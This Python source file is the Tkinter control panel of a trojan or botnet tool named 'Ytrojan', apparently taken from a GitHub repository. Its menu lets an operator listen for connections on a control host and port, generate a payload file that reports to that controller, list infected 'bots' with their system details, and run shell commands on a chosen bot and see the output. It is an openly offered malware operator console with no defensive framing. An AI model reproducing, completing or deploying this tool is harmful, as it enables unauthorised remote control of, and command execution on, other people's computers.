# github.com/ycy20090311
# 2023

import tkinter
import tkinter.ttk
import tkinter.messagebox
import YtrojanAPI
import YtrojanString

def ListenGUI():
    def Listen():
        Return = YtrojanAPI.Listen(ControlHostEntry.get(),ControlPortEntry.get())
        if Return == "listen ok":
            tkinter.messagebox.showinfo("Info","listen successfully")
            ListenWindow.destroy()
        elif Return == "listen no":
            tkinter.messagebox.showerror("Error","listen failed")
    ListenWindow = tkinter.Toplevel()
    ListenWindow.title("Listen")
    tkinter.ttk.Label(ListenWindow,text="ControlHost:").grid(row=0,column=0)
    tkinter.ttk.Label(ListenWindow,text="ControlPort:").grid(row=1,column=0)
    ControlHostEntry = tkinter.ttk.Entry(ListenWindow)
    ControlHostEntry.grid(row=0,column=1)
    ControlPortEntry = tkinter.ttk.Entry(ListenWindow)
    ControlPortEntry.grid(row=1,column=1)
    tkinter.ttk.Button(ListenWindow,text="Listen",command=Listen).grid(row=2,column=1)
    ListenWindow.mainloop()

def GenerateGUI():
    def Generate():
        Return = YtrojanAPI.Generate(FilePathEntry.get(),ControlHostEntry.get(),ControlPortEntry.get())
        if Return == "generate ok":
            tkinter.messagebox.showinfo("Info","generate successfully")
            GenerateWindow.destroy()
        elif Return == "generate no":
            tkinter.messagebox.showerror("Error","generate failed")
    GenerateWindow = tkinter.Toplevel()
    GenerateWindow.title("Generate")
    tkinter.ttk.Label(GenerateWindow,text="FilePath:").grid(row=0,column=0)
    tkinter.ttk.Label(GenerateWindow,text="ControlHost:").grid(row=1,column=0)
    tkinter.ttk.Label(GenerateWindow,text="ControlPort:").grid(row=2,column=0)
    FilePathEntry = tkinter.ttk.Entry(GenerateWindow)
    FilePathEntry.grid(row=0,column=1)
    ControlHostEntry = tkinter.ttk.Entry(GenerateWindow)
    ControlHostEntry.grid(row=1,column=1)
    ControlPortEntry = tkinter.ttk.Entry(GenerateWindow)
    ControlPortEntry.grid(row=2,column=1)
    tkinter.ttk.Button(GenerateWindow,text="Generate",command=Generate).grid(row=3,column=1)
    GenerateWindow.mainloop()

def RunGUI():
    def Run():
        Return = YtrojanAPI.Run(int(CommandEntry.get().split()[1]),CommandEntry.get().split(" ",2)[2])
        if Return.split()[0] == "shell" and Return.split(" ",1)[1] != "no":
            ReturnText.insert("insert","%s\n\n" % Return.split(" ",1)[1])
        elif Return.split()[1] == "ok":
            ReturnText.insert("insert","command successfully\n\n")
        elif Return.split()[1] == "no":
            ReturnText.insert("insert","command failed\n\n")
    RunWindow = tkinter.Toplevel()
    RunWindow.title("Run")
    CommandEntry = tkinter.ttk.Entry(RunWindow)
    ReturnText = tkinter.Text(RunWindow,width=50)
    CommandEntry.grid(row=0,column=0)
    ReturnText.grid(row=1,column=0)
    tkinter.ttk.Button(RunWindow,text="Run",command=Run).grid(row=2,column=0)

def ListBotGUI():
    Return = YtrojanAPI.ListBot()
    if Return != "":
        for BotInfo in Return.split("\n"):
            Tree.insert("",tkinter.END,values=BotInfo.split())
    elif Return == "":
        pass

Window = tkinter.Tk()
Window.title("YtrojanGUI")
Menu = tkinter.Menu(Window)
Menu.add_command(label="Listen",command=ListenGUI) 
Menu.add_command(label="Generate",command=GenerateGUI)
Menu.add_command(label="ListBot",command=ListBotGUI)
Menu.add_command(label="Run",command=RunGUI)
Tree = tkinter.ttk.Treeview(Window,column=["BotID","SystemName","NetworkName","CpuArch","Host"],show="headings")
Tree.column("BotID",width=50)
Tree.column("SystemName",width=240)
Tree.column("NetworkName",width=100)
Tree.column("CpuArch",width=100)
Tree.column("Host",width=100)
Tree.heading("BotID",text="BotID")
Tree.heading("SystemName",text="SystemName")
Tree.heading("NetworkName",text="NetworkName")
Tree.heading("CpuArch",text="CpuArch")
Tree.heading("Host",text="Host")
Tree.grid(row=0,column=0)
# Window.protocol("WM_DELETE_WINDOW",exit(0))
Window.config(menu=Menu)
Window.mainloop()
